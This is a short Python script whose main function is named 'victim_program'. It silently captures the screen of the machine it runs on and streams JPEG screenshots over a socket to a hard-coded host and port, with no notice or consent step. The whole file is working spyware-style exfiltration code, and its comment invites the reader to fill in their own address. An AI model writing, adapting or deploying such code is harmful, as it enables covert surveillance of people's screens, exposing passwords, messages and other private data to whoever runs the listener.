import socket
import pyautogui
import cv2
import numpy as np
import struct

def send_screenshot(conn):
    while True:
        try:
            screenshot = pyautogui.screenshot()
            frame = np.array(screenshot)
            frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
            encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), 90]
            result, img_encode = cv2.imencode('.jpg', frame, encode_param)
            data = np.array(img_encode)
            string_data = data.tobytes()
            conn.sendall(struct.pack("Q", len(string_data)) + string_data)
        except Exception as e:
            print("Error sending screenshot:", e)
            break



def victim_program():
    host = '192.168.1.60'  # Your private IP address
    port = 12345

    try:
        client_socket = socket.socket()
        client_socket.connect((host, port))
        print("Connected to server.")

        send_screenshot(client_socket)
    except Exception as e:
        print("An error occurred:", e)
    finally:
        client_socket.close()

if __name__ == '__main__':
    victim_program()
